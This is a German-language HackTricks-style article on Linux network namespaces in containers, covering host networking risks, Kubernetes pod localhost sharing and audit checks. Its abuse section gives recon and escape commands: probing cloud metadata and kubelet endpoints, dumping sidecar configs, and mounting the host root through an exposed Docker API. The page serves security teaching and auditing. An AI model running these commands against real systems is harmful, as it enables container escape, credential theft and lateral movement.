# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Interfaces, IP-Adressen, Routing-Tabellen, ARP-/Nachbarstatus, Firewall-Regeln, Sockets, den abstrakten UNIX-Domain-Socket-Namespace sowie den Inhalt von Dateien wie `/proc/net`. Deshalb kann ein Container ein scheinbar eigenes `eth0`, eigene lokale Routen und ein eigenes Loopback-Device besitzen, ohne den tatsächlichen Netzwerk-Stack des Hosts zu besitzen.

Aus Security-Sicht ist das relevant, weil Netzwerkisolation weit mehr umfasst als das Binden von Ports. Ein privater Netzwerk-Namespace beschränkt, was die Workload direkt beobachten oder rekonfigurieren kann. Sobald dieser Namespace mit dem Host geteilt wird, kann der Container plötzlich Einblick in Host-Listener, hostlokale Services, abstrakte AF_UNIX-Endpunkte und Netzwerk-Kontrollpunkte erhalten, die niemals für die Anwendung freigegeben werden sollten.

## Funktionsweise

Ein frisch erstellter Netzwerk-Namespace beginnt mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Interfaces daran angebunden werden. Container-Runtimes erstellen oder verbinden anschließend virtuelle Interfaces, weisen Adressen zu und konfigurieren Routen, damit die Workload die erwartete Konnektivität besitzt. In bridge-basierten Deployments bedeutet dies üblicherweise, dass der Container ein über veth angebundenes Interface sieht, das mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins die entsprechende Einrichtung für das Pod-Networking.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so drastische Änderung darstellt. Statt einen vorbereiteten privaten Netzwerk-Stack zu erhalten, tritt die Workload dem tatsächlichen Netzwerk-Stack des Hosts bei.

## Lab

Du kannst einen nahezu leeren Netzwerk-Namespace folgendermaßen anzeigen:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und Sie können normale Container und Container mit Host-Netzwerk vergleichen mit:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Der Host-Netzwerk verwendende Container verfügt nicht mehr über eine eigene isolierte Sicht auf Sockets und Interfaces. Diese Änderung allein ist bereits erheblich, noch bevor man überhaupt prüft, über welche Capabilities der Prozess verfügt.

## Verwendung zur Laufzeit

Docker und Podman erstellen normalerweise für jeden Container einen privaten Network Namespace, sofern nichts anderes konfiguriert wurde. Kubernetes weist jedem Pod normalerweise einen eigenen Network Namespace zu, der von den Containern innerhalb dieses Pods gemeinsam genutzt wird, aber vom Host getrennt ist. Das bedeutet, dass `127.0.0.1` normalerweise auf Pod-Ebene und nicht auf Container-Ebene lokal ist: Ein Listener, der nur an localhost gebunden ist, ist in einem Container typischerweise von dessen Sidecars und Geschwistern aus erreichbar. Incus/LXC-Systeme bieten ebenfalls eine umfangreiche Isolation auf Basis von Network Namespaces, oft mit einer größeren Vielfalt an virtuellen Netzwerk-Setups.

Das allgemeine Prinzip besteht darin, dass private Netzwerke standardmäßig die Isolationsgrenze bilden, während Host-Netzwerke eine ausdrückliche Umgehung dieser Grenze darstellen.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration ist schlicht das gemeinsame Verwenden des Network Namespaces des Hosts. Dies geschieht manchmal aus Performancegründen, für Low-Level-Monitoring oder aus Bequemlichkeit, entfernt jedoch eine der klarsten verfügbaren Grenzen für Container. Lokal auf dem Host erreichbare Listener werden auf direkterem Weg erreichbar, nur an localhost gebundene Services können zugänglich werden, und Capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden deutlich gefährlicher, da die von ihnen ermöglichten Operationen nun auf die netzwerkbezogene Umgebung des Hosts selbst angewendet werden.

Ein weiteres Problem ist die übermäßige Vergabe netzwerkbezogener Capabilities, selbst wenn der Network Namespace privat ist. Ein privater Namespace bietet zwar Schutz, macht Raw Sockets oder erweiterte Netzwerkkontrolle jedoch nicht harmlos.

In Kubernetes verändert `hostNetwork: true` außerdem, wie sehr man auf die Netzwerksegmentierung auf Pod-Ebene vertrauen kann. Kubernetes dokumentiert, dass viele Network Plugins den Traffic von `hostNetwork`-Pods bei der Zuordnung über `podSelector` / `namespaceSelector` nicht korrekt unterscheiden können und ihn daher wie normalen Node-Traffic behandeln. Aus Sicht eines Angreifers bedeutet das, dass eine kompromittierte `hostNetwork`-Workload häufig eher als Netzwerkzugang auf Node-Ebene und nicht als normaler Pod betrachtet werden sollte, der weiterhin denselben Policy-Annahmen wie Workloads in Overlay-Netzwerken unterliegt.

## Missbrauch

In schwach isolierten Setups können Angreifer die auf dem Host lauschenden Services untersuchen, Management-Endpunkte erreichen, die nur an Loopback gebunden sind, je nach genauen Capabilities und Umgebung Traffic sniffen oder beeinflussen oder Routing- und Firewall-Zustände neu konfigurieren, wenn `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann dies außerdem laterale Bewegungen und die Reconnaissance der Control Plane erleichtern.

Wenn du Host-Netzwerke vermutest, beginne damit zu bestätigen, dass die sichtbaren Interfaces und Listener zum Host und nicht zu einem isolierten Container-Netzwerk gehören:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Dienste, die nur über das Loopback-Interface erreichbar sind, sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstrakte UNIX-Sockets sind ein weiteres leicht zu übersehendes Ziel, da sie an den Netzwerk-Namespace gebunden sind, obwohl sie nicht wie TCP/UDP-Listener aussehen und möglicherweise nicht als Dateisystempfade unter `/run` existieren. Ein Container mit Host-Netzwerk kann dadurch Zugriff auf hosteigene Steuerkanäle erben, die nie in den Container bind-gemountet wurden:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Ein historisches Beispiel war der Fehler bei der Freigabe von `containerd-shim`-Abstract-Sockets, aber die übergeordnete Erkenntnis ist wichtiger als die konkrete CVE: Sobald ein Workload dem Netzwerk-Namespace des Hosts beitritt, gehören auch abstrakte AF_UNIX-Dienste zur Attack Surface. Wenn diese Sockets nach Runtime- oder Administrationsdiensten aussehen, pivot zu [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Wenn Netzwerk-Capabilities vorhanden sind, teste, ob der Workload den sichtbaren Stack inspizieren oder verändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Auf modernen Kerneln kann Host-Networking zusammen mit `CAP_NET_ADMIN` über einfache Änderungen an `iptables` / `nftables` hinaus auch den Paketpfad offenlegen. `tc`-qdiscs und -Filter sind ebenfalls auf den Namespace beschränkt. In einem gemeinsam genutzten Host-Network-Namespace gelten sie daher für die Host-Schnittstellen, die der Container sehen kann. Wenn zusätzlich `CAP_BPF` vorhanden ist, werden auch netzwerkbezogene eBPF-Programme wie TC- und XDP-Loader relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Das ist wichtig, weil ein Angreifer möglicherweise Traffic auf Ebene des Host-Interfaces spiegeln, umleiten, formen oder verwerfen kann und nicht nur Firewall-Regeln umschreiben kann. In einem privaten Network Namespace sind diese Aktionen auf die Sicht des Containers beschränkt; in einem gemeinsam genutzten Host Namespace wirken sie sich auf den Host aus.

In Cluster- oder Cloud-Umgebungen rechtfertigt Host-Networking außerdem eine schnelle lokale Recon von Metadaten und Services in der Nähe der Control Plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes gilt: Wenn **ein beliebiger** Container in einem Pod mit mehreren Containern kompromittiert wird, erhält man auch Zugriff auf die von benachbarten Containern und Sidecars geöffneten localhost-Listener, da der gesamte Pod einen gemeinsamen Network Namespace verwendet. Dies ist besonders relevant bei Service-Mesh-, Observability- und Helper-Containern, deren Admin- oder Debug-Schnittstellen absichtlich nur innerhalb des Pods und nicht clusterweit erreichbar sind:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Behandle „bound to localhost“ als **Pod-private**, nicht als **container-private**. Nachdem ein Container im Pod kompromittiert wurde, ist diese Annahme hinfällig.

### Vollständiges Beispiel: Host Networking + lokaler Runtime-/Kubelet-Zugriff

Host networking stellt nicht automatisch Host-Root bereit, legt aber häufig Services offen, die absichtlich nur vom Node selbst erreichbar sein sollen. Wenn einer dieser Services nur schwach geschützt ist, wird Host networking zu einem direkten Privilege-Escalation-Pfad.

Docker API auf localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Auswirkungen:

- direkter Host-Kompromittierung, wenn eine lokale Runtime-API ohne geeigneten Schutz exponiert ist
- Cluster-Aufklärung oder lateraler Bewegung, wenn Kubelet oder lokale Agents erreichbar sind
- Manipulation des Datenverkehrs oder Denial of Service in Kombination mit `CAP_NET_ADMIN`

## Prüfungen

Ziel dieser Prüfungen ist festzustellen, ob der Prozess über einen privaten Netzwerk-Stack verfügt, welche Routen und Listener sichtbar sind und ob die Netzwerkansicht bereits hostähnlich wirkt, bevor du überhaupt Capabilities testest.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Was ist hier interessant:

- Wenn `/proc/self/ns/net` und `/proc/1/ns/net` bereits wie der Host aussehen, verwendet der Container möglicherweise den Netzwerk-Namespace des Hosts oder einen anderen nicht privaten Namespace.
- `lsns -t net` und `ip netns identify` sind nützlich, wenn sich die Shell bereits innerhalb eines benannten oder persistenten Namespace befindet und du sie mit `/run/netns`-Objekten von der Host-Seite aus abgleichen möchtest.
- `ss -lntup` ist besonders wertvoll, da es ausschließlich an das Loopback-Interface gebundene Listener und lokale Management-Endpunkte offenlegt. `ss -xap` und `/proc/net/unix` ergänzen die Ansicht abstrakter Sockets, die bei gewöhnlichen Suchen nach Sockets im Dateisystem übersehen werden.
- Routen, Interface-Namen, Firewall-Kontext, `tc`-Status und eBPF-Attachments werden deutlich wichtiger, wenn `CAP_NET_ADMIN`, `CAP_NET_RAW` oder `CAP_BPF` vorhanden ist.
- In Kubernetes kann eine fehlgeschlagene Auflösung von Service-Namen aus einem `hostNetwork`-Pod einfach bedeuten, dass der Pod nicht `dnsPolicy: ClusterFirstWithHostNet` verwendet, und nicht, dass der Service fehlt.
- In Pods mit mehreren Containern gehören Loopback-Listener zum gesamten Netzwerk-Namespace des Pods. Überprüfe daher Sidecars und Schwester-Container, bevor du annimmst, dass ein ausschließlich an Loopback gebundener Port aus dem kompromittierten Container nicht erreichbar ist.

Bei der Überprüfung eines Containers solltest du den Netzwerk-Namespace immer zusammen mit dem Capability-Set bewerten. Host-Networking mit umfangreichen Netzwerk-Capabilities stellt eine völlig andere Sicherheitslage dar als Bridge-Networking mit einem eingeschränkten Standard-Capability-Set.

## Referenzen

- [Kubernetes NetworkPolicy und Einschränkungen von `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` und die Isolation abstrakter UNIX-Sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd-Hinweis: Abstrakte Unix-Domain-Sockets, die für Host-Network-Container offengelegt werden](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Anforderungen an eBPF-Token und Capabilities für netzwerkbezogene eBPF-Programme](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
